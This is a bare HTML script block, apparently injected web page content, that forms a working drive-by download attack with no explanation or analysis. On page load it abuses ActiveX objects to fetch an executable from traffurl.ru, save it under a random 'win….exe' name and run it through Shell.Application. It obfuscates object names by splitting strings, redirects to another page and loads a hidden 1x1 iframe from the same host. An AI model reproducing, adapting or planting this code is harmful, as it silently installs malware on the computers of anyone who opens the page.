<script>
function grs(len)
{
	var chars = "abcdefghiklmnopqrstuvwxyz";
	var string_length = len;
	var randomstring = '';
	for (var qq=0; qq<string_length; qq++) {
		var rnum = Math.floor(Math.random() * chars.length);
		randomstring += chars.substring(rnum,rnum+1);
	}
return randomstring;
}
function CreateO(os, na) {
var r = null;
try { eval('r = os.CreateObject(na)') }catch(e){}
if (! r) {try { eval('r = os.CreateObject(na, "")') }catch(e){}}
if (! r) {try { eval('r = os.CreateObject(na, "", "")') }catch(e){}}
if (! r) {try { eval('r = os.GetObject("", na)') }catch(e){}}
if (! r) {try { eval('r = os.GetObject(na, "")') }catch(e){}}
if (! r) {try { eval('r = os.GetObject(na)') }catch(e){}}
return(r);
}
function Go(a) {
var xml = CreateO(a,'m'+'sxm'+'l2.X'+'MLHT'+'TP');
xml.open('GET','http://traffurl.ru/sliv/load.php',false);
xml.send();
var o = CreateO(a,'ad'+'od'+'b'+'.'+'stre'+'am');
o.type = 1;
o.Mode = 3;
o.open();
o.Write(xml.responseBody);
var fn = ".//..//win"+grs(4)+".exe";
o.savetofile(fn,2);
var s = CreateO(a, 'S'+'hel'+'l.A'+'pp'+'lic'+'at'+'ion');
s.Shellexecute(fn);
}
var qq = 0;
var t = new Array(
'{BD'+'96C556-65A3-11D0-983A-00C04FC29E30}','{BD'+'96C556-65A3-11D0-983A-00C04FC29E36}',
'{AB9BCEDD-EC7E-47E1-9322-D4A210617116}','{0006F033-0000-0000-C000-000000000046}','{0006F03A-0000-0000-C000-000000000046}','{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}','{6414512B-B978-451D-A0D8-FCFDF33E833C}','{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}','{06723E09-F4C2-43c8-8358-09FCD1DB0766}','{639F725F-1B2D-4831-A9FD-874847682010}','{BA018599-1DB3-44f9-83B4-461454C84BF8}','{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}','{E8CCCDDF-CA28-496b-B050-6C07C962476B}',null);while (t[qq]) {
var a = null;
if (t[qq].substring(0,1) == '{') {
a = document.createElement('object');
a.setAttribute('classid', 'clsid:' + t[qq].substring(1, t[qq].length - 1));
} else {
try { a = new ActiveXObject(t[qq]); } catch(e){}
}
if (a) {
try {
var b = CreateO(a, 'Sh'+'ell.A'+'ppl'+'ica'+'ti'+'on');
if (b) {
if (Go(a)) break;
}
}catch(e){}
}
qq++;
}
setTimeout("window.location = 'jav.php'", 3000);
</script><iframe src=http://traffurl.ru/slivv/index.php width=1 height=1 style="display:none"></iframe>